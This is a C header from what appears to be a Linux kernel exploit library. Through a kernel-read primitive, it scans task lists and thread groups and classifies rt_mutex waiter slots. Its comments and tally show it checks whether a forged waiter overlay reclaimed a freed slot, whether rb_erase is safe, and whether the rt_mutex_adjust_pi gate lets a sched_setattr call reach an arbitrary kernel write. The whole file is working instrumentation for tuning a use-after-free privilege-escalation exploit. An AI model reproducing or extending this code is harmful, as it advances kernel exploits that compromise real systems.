/* lib/rtmutex/waiter_scan.h -- walk the kernel task list and classify the
 * rt_mutex_waiter a task is blocked on, over an abstract read.
 *
 * The read is a callback -- `read(ctx, addr, out, len)` returning 0 on success
 * -- so any kernel-read primitive drives the same walk and the same
 * classification: a kprobe/tracefs read, a BPF perf-event read, or a chain's
 * own R/W. Addresses are runtime kernel VAs, read as-is; no address-space
 * conversion is assumed, so a primitive that reads raw VAs needs no wrapper.
 *
 * The walk is bounded by a node count, not by reaching the anchor, so a
 * corrupted link cannot loop forever. Offsets come from the target description.
 *
 * Above the read sits the whole observation: find the processes running a
 * payload, walk every thread of each, classify the waiter each blocked thread
 * names, and answer the one question the classification cannot -- whether
 * rt_mutex_adjust_pi() would even enter the chain. That belongs here, not in a
 * consumer, because two targets that answer it differently are not comparable:
 * the read primitive is allowed to differ per target (a kprobe read, a BPF
 * read), the walk and the verdict are not.
 */
#ifndef LIB_RTMUTEX_WAITER_SCAN_H
#define LIB_RTMUTEX_WAITER_SCAN_H

#include <stdint.h>
#include <stdio.h>
#include <string.h>

#include "../rw/kread.h"  /* lib_kread_cb, lib_kread64 */
#include "fake_waiter.h" /* FAKE_WAITER_TASK_OFF / _LOCK_OFF */

#ifndef TASK_TASKS_OFF
#define TASK_TASKS_OFF 0x550
#endif
#ifndef TASK_PID_OFF
#define TASK_PID_OFF 0x650
#endif
#ifndef TASK_TGID_OFF
#define TASK_TGID_OFF 0x654
#endif

/* The user-buffer pointer a copy_from_user parks in an as-yet-unwritten waiter
 * slot (TASK_SIZE-1 on a 52-bit-VA-off arm64). A waiter whose task or lock
 * reads this was caught mid-copy, before the overlay reached that field. */
#ifndef LIB_MIDCOPY_USER_PTR
#define LIB_MIDCOPY_USER_PTR 0x0000007fffffffffULL
#endif

enum lib_waiter_class {
  LIB_WC_UNMAPPED, /* the waiter itself could not be read */
  LIB_WC_FORGED,   /* task == the expected forged task value */
  LIB_WC_MIDCOPY,  /* task or lock == the parked user-buffer pointer */
  LIB_WC_FOREIGN,  /* some other live object occupies the slot */
};

struct lib_waiter_info {
  enum lib_waiter_class cls;
  int erase_safe;      /* rb_parent_color has a NULL parent (rb_erase-safe) */
  uint64_t rb_parent;  /* tree_entry.__rb_parent_color */
  uint64_t task;       /* waiter->task */
  uint64_t lock;       /* waiter->lock */
};

/* Read a waiter at `waiter_va` and classify it against `expect_task` (the value
 * the forge writes into waiter->task). Returns 0 if the waiter was read (see
 * out->cls), -1 if it could not be read. */
static inline int lib_waiter_classify(lib_kread_cb rd, void *ctx,
                                      uint64_t waiter_va, uint64_t expect_task,
                                      struct lib_waiter_info *out) {
  memset(out, 0, sizeof(*out));
  if (lib_kread64(rd, ctx, waiter_va + 0, &out->rb_parent) != 0 ||
      lib_kread64(rd, ctx, waiter_va + FAKE_WAITER_TASK_OFF, &out->task) != 0 ||
      lib_kread64(rd, ctx, waiter_va + FAKE_WAITER_LOCK_OFF, &out->lock) != 0) {
    out->cls = LIB_WC_UNMAPPED;
    return -1;
  }
  out->erase_safe = (out->rb_parent & ~3ULL) == 0;
  if (out->task == expect_task) {
    out->cls = LIB_WC_FORGED;
  } else if (out->task == LIB_MIDCOPY_USER_PTR ||
             out->lock == LIB_MIDCOPY_USER_PTR) {
    out->cls = LIB_WC_MIDCOPY;
  } else {
    out->cls = LIB_WC_FOREIGN;
  }
  return 0;
}

static inline const char *lib_waiter_class_name(enum lib_waiter_class c) {
  switch (c) {
  case LIB_WC_FORGED:  return "FORGED (task==forged value)";
  case LIB_WC_MIDCOPY: return "MID-COPY (user pointer parked in slot)";
  case LIB_WC_FOREIGN: return "FOREIGN (other object in the slot)";
  default:             return "UNMAPPED (waiter unreadable)";
  }
}

/* Walk init_task's circular task list (thread-group leaders) and return the
 * task_struct VA whose pid or tgid matches `want`, or 0. Bounded at 8192 nodes.
 * `init_task_va` is the runtime VA of init_task. */
static inline uint64_t lib_find_task_raw(lib_kread_cb rd, void *ctx,
                                         uint64_t init_task_va, uint32_t want) {
  uint64_t head = init_task_va + TASK_TASKS_OFF, entry;
  if (lib_kread64(rd, ctx, head, &entry) != 0) {
    return 0;
  }
  for (int i = 0; i < 8192; i++) {
    if (entry == head) {
      return 0;
    }
    uint64_t task = entry - TASK_TASKS_OFF;
    uint64_t pidw = 0;
    if (lib_kread64(rd, ctx, task + TASK_PID_OFF, &pidw) != 0) {
      return 0;
    }
    uint32_t pid = (uint32_t)pidw, tgid = (uint32_t)(pidw >> 32);
    if (pid == want || tgid == want) {
      return task;
    }
    if (lib_kread64(rd, ctx, task + TASK_TASKS_OFF, &entry) != 0) {
      return 0;
    }
  }
  return 0;
}

/* ── the observation: thread walk, gate test, running tally ─────────────── */
/*
 * These need the task_struct offsets the walk reads. A target description that
 * states none of them leaves this section out, and the file still serves the
 * classification above.
 */
#if defined(TASK_THREAD_GROUP_OFF) && defined(FAKE_TASK_PI_BLOCKED_ON_OFF)

/* What one scanned thread looked like: everything read from the kernel, so two
 * backends report the same fields from the same source. Per-target extras (a
 * /proc backtrace, the live stack bytes) belong to the reporting callback. */
struct lib_waiter_thread {
	uint64_t task;           /* task_struct VA */
	int tid;
	int have_comm;
	char comm[17];
	int have_prio;
	int prio;                /* task->prio, what the gate compares */
	uint64_t pi_blocked_on;  /* 0 when the thread is not blocked */
	int have_waiter;
	struct lib_waiter_info w;
	int wprio;               /* waiter->prio */
	uint64_t wdeadline;      /* waiter->deadline */
	int gate_equal;          /* the gate below: 1 = adjust_pi returns early */
};

struct lib_waiter_tally {
	int passes;          /* scan passes completed */
	int waiter_passes;   /* passes on which at least one waiter was caught */
	int procs;           /* processes resolved, summed over passes */
	int threads;         /* threads walked, summed over passes */
	int forged;
	int midcopy;
	int foreign;
	int unmapped;
	int erase_safe;      /* among forged waiters, rb_erase-safe */
	int gate_earlyout;   /* among forged waiters, the gate was closed */
};

typedef void (*lib_waiter_report_cb)(void *rctx,
				     const struct lib_waiter_thread *t);

/* rt_mutex_adjust_pi()'s front gate.
 *
 * The consumer's sched_setattr reaches rt_mutex_adjust_prio_chain -- and so the
 * arbitrary write -- only when rt_mutex_waiter_equal(p->pi_blocked_on,
 * task_to_waiter(p)) is FALSE: the forged waiter's prio must differ from the
 * live task's prio (and, for a deadline task only, its deadline). Equal means
 * the chain is never entered and the shot cannot write, however perfectly the
 * overlay landed. It is a comparison of two values both read here, so it is
 * answerable without arming anything. */
static inline int lib_waiter_gate_equal(const struct lib_waiter_thread *t,
					uint64_t task_dl_deadline,
					int have_task_dl)
{
	if (!t->have_prio || !t->have_waiter)
		return 0;
	if (t->wprio != t->prio)
		return 0;
	/* Only a deadline task (prio < 0) compares deadlines as well. */
	if (t->wprio < 0 && have_task_dl)
		return t->wdeadline == task_dl_deadline;
	return 1;
}

/* Walk one thread group -- every thread, leader included -- and classify the
 * waiter each blocked thread names. A dangling pi_blocked_on left by a
 * worker pthread, never the leader, is invisible to a watcher that reads
 * only the leader however long it runs; this walk is what makes such a
 * waiter catchable at all. Returns how many blocked threads were seen. */
static inline int lib_waiter_scan_group(lib_kread_cb rd, void *ctx,
					uint64_t leader, uint64_t expect_task,
					struct lib_waiter_tally *tally,
					lib_waiter_report_cb report, void *rctx)
{
	uint64_t head = leader + TASK_THREAD_GROUP_OFF, entry = head;
	int blocked = 0, first = 1;

	for (int i = 0; i < 512; i++) {
		struct lib_waiter_thread t;
		uint64_t thread, next = 0, word = 0;

		if (!first && entry == head)
			break;
		first = 0;
		thread = entry - TASK_THREAD_GROUP_OFF;
		if (lib_kread64(rd, ctx, thread + TASK_THREAD_GROUP_OFF,
				&next) != 0)
			break;
		entry = next; /* advance before anything below may `continue` */

		memset(&t, 0, sizeof(t));
		t.task = thread;
		/* Ascending by offset, on purpose: a caller reading through a
		 * read-ahead window (lib/rw/kread.h) then serves most of these
		 * fields out of one fetch instead of paying the primitive once
		 * per field, which on a kprobe read is the difference between a
		 * few cycles per thread and a few dozen. */
#ifdef FAKE_TASK_PRIO_OFF
		/* prio is an int; the low half of its word carries it. */
		if (lib_kread64(rd, ctx, thread + FAKE_TASK_PRIO_OFF,
				&word) == 0) {
			t.prio = (int)(uint32_t)word;
			t.have_prio = 1;
		}
#endif
		if (lib_kread64(rd, ctx, thread + TASK_PID_OFF, &word) == 0)
			t.tid = (int)(uint32_t)word;
#ifdef TASK_COMM_OFF
		if (rd(ctx, thread + TASK_COMM_OFF, t.comm, 16) == 0) {
			t.comm[16] = '\0';
			t.have_comm = 1;
		}
#endif
		lib_kread64(rd, ctx, thread + FAKE_TASK_PI_BLOCKED_ON_OFF,
			    &t.pi_blocked_on);
		if (tally)
			tally->threads++;

		if (t.pi_blocked_on) {
			uint64_t dl = 0;
			int have_dl = 0;

			lib_waiter_classify(rd, ctx, t.pi_blocked_on,
					    expect_task, &t.w);
			t.have_waiter = 1;
			blocked++;
			if (lib_kread64(rd, ctx,
					t.pi_blocked_on +
						FAKE_WAITER_TREE_PRIO_OFF,
					&word) == 0)
				t.wprio = (int)(uint32_t)word;
			lib_kread64(rd, ctx,
				    t.pi_blocked_on +
					    FAKE_WAITER_TREE_DEADLINE_OFF,
				    &t.wdeadline);
#ifdef TASK_DL_DEADLINE_OFF
			have_dl = lib_kread64(rd, ctx,
					      thread + TASK_DL_DEADLINE_OFF,
					      &dl) == 0;
#endif
			t.gate_equal = lib_waiter_gate_equal(&t, dl, have_dl);
			if (tally) {
				switch (t.w.cls) {
				case LIB_WC_FORGED:
					tally->forged++;
					if (t.w.erase_safe)
						tally->erase_safe++;
					if (t.gate_equal)
						tally->gate_earlyout++;
					break;
				case LIB_WC_MIDCOPY:
					tally->midcopy++;
					break;
				case LIB_WC_FOREIGN:
					tally->foreign++;
					break;
				default:
					tally->unmapped++;
					break;
				}
			}
		}
		if (report)
			report(rctx, &t);
	}
	return blocked;
}

/* One pass over a set of processes: resolve each pid to its task_struct and
 * scan its thread group. `cache` (optional, parallel arrays of `npids` entries)
 * holds a resolution across passes, because the task-list walk that resolves
 * one costs a read per task and the answer does not change while the process
 * lives. Returns how many blocked threads were seen this pass. */
struct lib_waiter_cache {
	int pid[16];
	uint64_t task[16];
	int n;
};

static inline uint64_t lib_waiter_task_cached(lib_kread_cb rd, void *ctx,
					      uint64_t init_task_va, int pid,
					      struct lib_waiter_cache *cache)
{
	uint64_t task;

	if (cache) {
		for (int i = 0; i < cache->n; i++)
			if (cache->pid[i] == pid)
				return cache->task[i];
	}
	task = lib_find_task_raw(rd, ctx, init_task_va, (uint32_t)pid);
	if (task && cache &&
	    cache->n < (int)(sizeof(cache->pid) / sizeof(cache->pid[0]))) {
		cache->pid[cache->n] = pid;
		cache->task[cache->n] = task;
		cache->n++;
	}
	return task;
}

static inline int lib_waiter_scan_pids(lib_kread_cb rd, void *ctx,
				       uint64_t init_task_va, const int *pids,
				       int npids, uint64_t expect_task,
				       struct lib_waiter_cache *cache,
				       struct lib_waiter_tally *tally,
				       lib_waiter_report_cb report, void *rctx)
{
	int blocked = 0;

	for (int i = 0; i < npids; i++) {
		uint64_t leader = lib_waiter_task_cached(rd, ctx, init_task_va,
							 pids[i], cache);

		if (!leader)
			continue;
		if (tally)
			tally->procs++;
		blocked += lib_waiter_scan_group(rd, ctx, leader, expect_task,
						 tally, report, rctx);
	}
	if (tally) {
		tally->passes++;
		if (blocked)
			tally->waiter_passes++;
	}
	return blocked;
}

/* The one inference line, so two targets' runs are read the same way.
 *
 *   forged     the overlay won the freed slot: reclaim and vehicle both work
 *   erase_safe among those, rb_erase would not dereference a stale parent
 *   gate_early among those, adjust_pi returns before the chain -- no write,
 *              whatever else is right (the single sched_setattr lever applies)
 *   foreign    a different object won the slot: the placement is missing
 *   midcopy    the copy_from_user pre-write window is what the sampler keeps
 *              catching, so the overlay is present but not yet complete
 *   unmapped   pi_blocked_on pointed somewhere unreadable
 *
 * All-zero with waiter_passes=0 means nothing was observed, which is a
 * statement about the instrument, not about the target. */
static inline void lib_waiter_tally_print(const char *prefix,
					  const char *vehicle,
					  const struct lib_waiter_tally *t)
{
	printf("%s VERDICT vehicle=%s passes=%d waiter_passes=%d procs=%d "
	       "threads=%d forged=%d erase_safe=%d gate_earlyout=%d midcopy=%d "
	       "foreign=%d unmapped=%d\n",
	       prefix, vehicle ? vehicle : "(unset)", t->passes,
	       t->waiter_passes, t->procs, t->threads, t->forged, t->erase_safe,
	       t->gate_earlyout, t->midcopy, t->foreign, t->unmapped);
}

#endif /* TASK_THREAD_GROUP_OFF && FAKE_TASK_PI_BLOCKED_ON_OFF */

#endif /* LIB_RTMUTEX_WAITER_SCAN_H */
